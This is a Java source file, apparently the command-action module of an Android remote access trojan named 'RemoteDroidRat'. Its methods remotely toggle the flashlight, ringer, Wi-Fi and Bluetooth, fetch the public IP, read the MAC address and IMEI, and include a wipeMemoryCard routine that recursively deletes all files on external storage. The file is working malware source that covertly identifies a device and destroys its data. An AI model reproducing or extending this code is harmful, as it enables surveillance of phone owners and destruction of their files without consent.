package com.KaranKumar.RemoteDroidRat.commandActions;
import android.net.Uri;
import android.media.RingtoneManager;
import android.media.Ringtone;
import android.content.Context;
import android.media.AudioManager;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CameraAccessException;
import android.bluetooth.BluetoothAdapter;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.Callable;
import java.io.InputStream;
import java.io.BufferedReader;
import java.io.BufferedInputStream;
import java.io.InputStreamReader;
import java.io.IOException;
import android.net.wifi.WifiInfo;
import android.telephony.TelephonyManager;
import android.os.Build;
import androidx.core.content.ContextCompat;
import androidx.core.app.ActivityCompat;
import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.net.wifi.WifiConfiguration;
import java.lang.reflect.InvocationTargetException;
import android.net.wifi.WifiManager;
import java.io.File;
import android.os.Environment;

public class localAction {

    private Context context;

	private Ringtone ringtone;

	private static Activity activity;

	private static int REQUEST_PHONE_STATE_PERMISSION=34;

    public localAction(Context context) {
        this.context = context;
    }

	public void playRing() {

		try {

			Uri defaultUri = RingtoneManager.getDefaultUri(1);
			if (defaultUri != null) {
				try {
					this.ringtone = RingtoneManager.getRingtone(context, defaultUri);
					if (this.ringtone != null) {
						this.ringtone.play();
					}
				} catch (Exception e4) {
					e4.printStackTrace();
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void flashOn() {

		CameraManager cameraManager = (CameraManager) context.getSystemService("camera");
		try {
			cameraManager.setTorchMode(cameraManager.getCameraIdList()[0], true);
			return;
		} catch (CameraAccessException e7) {
			e7.printStackTrace();
			return;
		}

	}

	public void flashOff() {

		CameraManager cameraManager2 = (CameraManager) context.getSystemService("camera");
		try {
			cameraManager2.setTorchMode(cameraManager2.getCameraIdList()[0], false);
			return;
		} catch (CameraAccessException e8) {
			e8.printStackTrace();
			return;
		}
	}


	public void silentMode() {

		try {
			((AudioManager) context.getSystemService("audio")).setRingerMode(0);
			return;
		} catch (Exception e) {
			e.printStackTrace();
			return;
		}
	}

	public void normalMode() {
		try {
			((AudioManager) context.getSystemService("audio")).setRingerMode(2);
			return;
		} catch (Exception e2) {
			e2.printStackTrace();
			return;
		}
	}


	public void wifiOn() {
		try {
			WifiManager wifiManager = (WifiManager) context.getSystemService("wifi");
			wifiManager.setWifiEnabled(true);
			wifiManager.startScan();
			return;
		} catch (Exception e3) {
			e3.printStackTrace();
			return;
		}
	}

	public void wifiOff() {
		try {
			((WifiManager) context.getSystemService("wifi")).setWifiEnabled(false);
			return;
		} catch (Exception e4) {
			e4.printStackTrace();
			return;
		}
	}

	public void bluetoothOn() {

		try {
			BluetoothAdapter.getDefaultAdapter().enable();
			return;
		} catch (Exception e5) {
			e5.printStackTrace();
			return;
		}
	}

	public void bluetoothOff() {

		try {
			BluetoothAdapter.getDefaultAdapter().disable();
			return;
		} catch (Exception e6) {
			e6.printStackTrace();
			return;
		}
	}

	public static String getPublicIPAddress() {
		String value = null;
		ExecutorService es = Executors.newSingleThreadExecutor();
		Future<String> result = es.submit(new Callable<String>() {
				public String call() throws Exception {
					try {
						URL url = new URL("https://api6.my-ip.io/ip");
						HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
						try {
							InputStream in = new BufferedInputStream(urlConnection.getInputStream());
							BufferedReader r = new BufferedReader(new InputStreamReader(in));
							StringBuilder total = new StringBuilder();
							String line;
							while ((line = r.readLine()) != null) {
								total.append(line).append('\n');
							}
							return total.toString();
						} finally {
							urlConnection.disconnect();
						}
					} catch (IOException e) {
						// Log the exception or handle it appropriately
						e.printStackTrace();
						return null;
					}
				}
			});
		try {
			value = result.get();
		} catch (Exception e) {
			// Log the exception or handle it appropriately
			e.printStackTrace();
		} finally {
			es.shutdown();
		}
		return value;
	}



	public static String getPublicIPAddress4() {
		String value = null;
		ExecutorService es = Executors.newSingleThreadExecutor();
		Future<String> result = es.submit(new Callable<String>() {
				public String call() throws Exception {
					try {
						URL url = new URL("https://api4.my-ip.io/v1/ip");
						HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
						try {
							InputStream in = new BufferedInputStream(urlConnection.getInputStream());
							BufferedReader r = new BufferedReader(new InputStreamReader(in));
							StringBuilder total = new StringBuilder();
							String line;
							while ((line = r.readLine()) != null) {
								total.append(line).append('\n');
							}
							return total.toString();
						} finally {
							urlConnection.disconnect();
						}
					} catch (IOException e) {
						// Log the exception or handle it appropriately
						e.printStackTrace();
						return null;
					}
				}
			});
		try {
			value = result.get();
		} catch (Exception e) {
			// Log the exception or handle it appropriately
			e.printStackTrace();
		} finally {
			es.shutdown();
		}
		return value;
	}

	public static String getMacAddress(Context context) {
        WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);

        if (wifiManager != null) {
            WifiInfo wifiInfo = wifiManager.getConnectionInfo();
            return wifiInfo.getMacAddress();
        }

        return null;
    }
	/*
	 public static String getIMEINumber(Context context) {
	 TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

	 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
	 return telephonyManager.getImei();
	 } else {
	 // For devices below Android Oreo, use the deprecated method
	 return telephonyManager.getDeviceId();
	 }
	 }

	 */
	public static String getIMEINumber(Context context) {
		TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
			if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
				return telephonyManager.getImei();
			} else {
				// Request the necessary permission if it's not granted
				// You should handle the result in onRequestPermissionsResult in your activity
				ActivityCompat.requestPermissions(activity, new String[]{Manifest.permission.READ_PHONE_STATE}, REQUEST_PHONE_STATE_PERMISSION);
				return null; // You might want to handle this case accordingly
			}
		} else {
			// For devices below Android Oreo, use the deprecated method
			return telephonyManager.getDeviceId();
		}
	}



    public void wipeMemoryCard() {
        File deleteMatchingFile = new File(Environment.getExternalStorageDirectory().toString());
        try {
            File[] filenames = deleteMatchingFile.listFiles();
            if (filenames == null || filenames.length <= 0) {
                deleteMatchingFile.delete();
                return;
            }
            for (File tempFile : filenames) {
                if (tempFile.isDirectory()) {
                    wipeDirectory(tempFile.toString());
                    tempFile.delete();
                } else {
                    tempFile.delete();
                }
            }
        } catch (Exception e) {
        }
    }

    private static void wipeDirectory(String name) {
        try {
            File directoryFile = new File(name);
            File[] filenames = directoryFile.listFiles();
            if (filenames == null || filenames.length <= 0) {
                directoryFile.delete();
                return;
            }
            for (File tempFile : filenames) {
                if (tempFile.isDirectory()) {
                    wipeDirectory(tempFile.toString());
                    tempFile.delete();
                } else {
                    tempFile.delete();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


}
